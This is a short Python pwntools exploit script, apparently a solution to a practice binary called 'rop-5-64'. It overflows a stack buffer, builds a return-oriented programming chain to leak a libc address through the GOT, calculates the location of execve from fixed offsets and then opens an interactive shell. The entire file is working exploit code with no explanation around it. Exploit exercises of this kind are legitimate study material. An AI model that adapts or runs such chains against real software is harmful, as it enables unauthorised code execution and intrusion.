#!/usr/bin/env python
from pwn import *

p = process("./rop-5-64")

#context.terminal = ['tmux', 'splitw', '-h']
# this will spawn gdb for you (remove this if you do not want gdb)
#gdb.attach(p)

got_of_printf = p.elf.got['printf']
printf_at_plt = p.elf.plt['printf']
input_func = p.elf.symbols['input_func']

print("Got of printf %s" % hex(got_of_printf))
print("Printf@plt %s" % hex(printf_at_plt))
print("input_func() %s" % hex(input_func))

'0x0000000000400763 : pop rdi ; ret'
pop_rdi = p64(0x400763)
pop_rsi = p64(0x400761)
pop_rdx = p64(0x400688)

buf = "A" * 0x80 + "B" * 8

#buf += pop_rsi
#buf += p64(0)
#buf += p64(0)
buf += pop_rdi
buf += p64(0x601018)
buf += p64(p.elf.symbols['puts'])
buf += p64(p.elf.symbols['input_func'])

"""
buf += pop_rdi
buf += p64(got_of_printf + 1)
buf += p64(printf_at_plt + 1)
buf += p64(input_func)
"""
#with open("somthing.txt", "wb") as f:
    #f.write(buf)

p.recv()
p.sendline(buf)
data = p.recvuntil("!")
addr = p.recv(10)[1:9]
#raw_data = data[len(buf) + 17:]
raw_data = addr
print(repr(raw_data))
libc_printf = u64(raw_data)
libc_printf &= 0x0000ffffffffffff
print("Addr of printf %s" % hex(libc_printf))

"""
$1 = {<text variable, no debug info>} 0xf7d63670 <__printf>
pwndbg> print execve
$2 = {<text variable, no debug info>} 0xf7dca7e0 <execve>
"""

offset = libc_printf - 0x6f690

libc_execve = offset + 0xcc770

buf = "A" * 0x80 + "B" * 8
buf += pop_rdi
# 0x400020:"@"
buf += p64(0x400020)
buf += pop_rsi
buf += p64(0)
buf += p64(0)
buf += pop_rdx
buf += p64(0)
buf += p64(0)
buf += p64(libc_execve)

p.sendline(buf)
p.interactive()
